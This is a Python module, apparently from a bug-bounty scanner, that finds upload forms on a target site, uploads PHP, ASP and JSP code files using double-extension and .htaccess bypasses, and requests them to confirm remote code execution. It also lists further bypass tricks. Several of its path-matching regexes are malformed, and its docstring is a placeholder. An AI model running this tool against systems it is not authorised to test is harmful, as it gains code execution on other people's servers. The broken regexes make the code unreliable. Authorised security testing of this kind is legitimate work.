"""文件上传检测工具 — 真正上传 + 验证可访问性"""

import hashlib
import json
import os
import re
from typing import Optional
from urllib.parse import urljoin, urlparse

from ..client import HttpClient
from ..utils import normalize_url


async def bb_file_upload(
    url: str,
    proxy: Optional[str] = None,
    cookie: Optional[str] = None,
    auth_token: Optional[str] = None,
    timeout: int = 15,
) -> str:
    """... (docstring same as before) ..."""
    url = normalize_url(url)
    base_domain = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
    results = []
    results.append(f"[*] ===== {url}")
    results.append("")

    client = HttpClient(timeout=timeout, proxy=proxy, cookie=cookie, auth_token=auth_token)
    upload_marker = f"xuanmu_{hashlib.md5(os.urandom(8)).hexdigest()[:8]}"
    payload_php = f"<?php echo '{upload_marker}';?>"
    payload_jsp = f'<%= "{upload_marker}" %>'
    payload_asp = f'<%Response.Write("{upload_marker}")%>'

    # 1. analyze page for upload forms
    upload_endpoint = url
    upload_field = "file"
    is_multipart = False
    has_file_input = False

    try:
        resp = await client.get(url)
        body = resp.text

        form_m = re.search(
            r'<form[^>]*action=["\']([^"\']*)["\'][^>]*enctype=["\']multipart/form-data["\'][^>]*>',
            body, re.IGNORECASE | re.DOTALL,
        )
        if form_m:
            action = form_m.group(1)
            is_multipart = True
            results.append("[+] 发现 multipart/form-data 上传表单")
            if action and not action.startswith(("#", "javascript:")):
                upload_endpoint = urljoin(url, action)

        input_m = re.search(r'<input[^>]*type=["\']file["\'][^>]*>', body, re.IGNORECASE)
        if input_m:
            has_file_input = True
            name_m = re.search(r'name=["\']([^"\']*)["\']', input_m.group(0))
            if name_m:
                upload_field = name_m.group(1)

        results.append(f"[*] 上传端点: {upload_endpoint}")
        results.append(f"[*] 字段名: {upload_field}")

        if not is_multipart and not has_file_input and "upload" not in body.lower():
            results.append("")
            results.append("[INFO] 未发现上传功能")
            return "\n".join(results)

    except Exception as e:
        results.append(f"[!] 页面获取失败: {e}")

    # 2. try uploading
    results.append("")
    results.append("[*] 实际上传测试:")
    results.append("")

    test_cases = [
        ("test.php", payload_php, "application/x-php", "PHP"),
        ("test.jpg.php", payload_php, "image/jpeg", "双扩展 .jpg.php"),
        ("test.php.jpg", payload_php, "image/jpeg", "双扩展 .php.jpg"),
        ("test.asp", payload_asp, "text/plain", "ASP"),
        ("test.jsp", payload_jsp, "text/plain", "JSP"),
        ("test.htaccess", "AddType x-httpd-php .jpg\n", "text/plain", ".htaccess"),
    ]

    uploaded_files = []
    for filename, content, mime, test_name in test_cases:
        try:
            files_data = {upload_field: (filename, content, mime)}
            resp = await client.post(upload_endpoint, files=files_data)
            status = resp.status_code
            resp_body = resp.text[:500]

            # try to extract file path from response
            extracted_path = None

            # pattern 1: regex paths in response
            for pat in [
                rf'(https?://[^"\'<>s]+{re.escape(filename)})',
                rf'("/?uploads?/[^"\'<>{re.escape(filename)}',
                rf'("/?files?/[^"\'<>{re.escape(filename)}',
            ]:
                pm = re.search(pat, resp_body)
                if pm:
                    extracted_path = pm.group(1).strip('"')
                    break

            # pattern 2: JSON response with url/path field
            if not extracted_path:
                try:
                    jr = json.loads(resp_body)
                    for k in ("url", "path", "file", "location", "filename"):
                        v = jr.get(k, "")
                        if v and isinstance(v, str) and len(v) > 5:
                            extracted_path = urljoin(base_domain, v)
                            break
                except Exception:
                    pass

            # pattern 3: guess common upload paths
            if not extracted_path and status in (200, 201, 204):
                for d in ("/uploads/", "/files/", "/upload/", "/images/"):
                    p = urljoin(base_domain, d + filename)
                    try:
                        cr = await client.get(p, timeout=5)
                        if cr.status_code == 200:
                            extracted_path = p
                            break
                    except Exception:
                        continue

            if extracted_path:
                uploaded_files.append((filename, extracted_path, test_name))
                results.append(f"  [{status}] {test_name}: {filename} (路径: {extracted_path})")
            elif status in (200, 201, 204):
                results.append(f"  [{status}] {test_name}: {filename} (200 OK, 路径未知)")
            elif status == 500:
                results.append(f"  [{status}] {test_name}: {filename} (服务器500 - 上传/保存失败)")
            elif status == 302:
                results.append(f"  [{status}] {test_name}: {filename} (跳转)")
            else:
                results.append(f"  [{status}] {test_name}: {filename}")
        except Exception as e:
            results.append(f"  [!] {test_name}: {str(e)[:60]}")

    # 3. verify uploaded files
    results.append("")
    if uploaded_files:
        results.append(f"[!] 可能上传成功的文件 ({len(uploaded_files)}):")
        for fn, fp, tn in uploaded_files:
            results.append(f"  {fp}")
            try:
                er = await client.get(fp, timeout=10)
                if upload_marker in er.text:
                    results.append(f"    [代码执行] HTTP {er.status_code}")
                elif er.status_code == 200:
                    results.append(f"    [可读] HTTP {er.status_code} ({len(er.text)}b)")
                else:
                    results.append(f"    [HTTP {er.status_code}]")
            except Exception as e:
                results.append(f"    [访问失败] {str(e)[:60]}")
    else:
        results.append("[-] 未验证到上传成功的文件")

    results.append("")
    results.append("[*] 绕过技巧: Content-Type修改 / 双扩展 / .htaccess / 大小写 / SVG-XSS")
    return "\n".join(results)
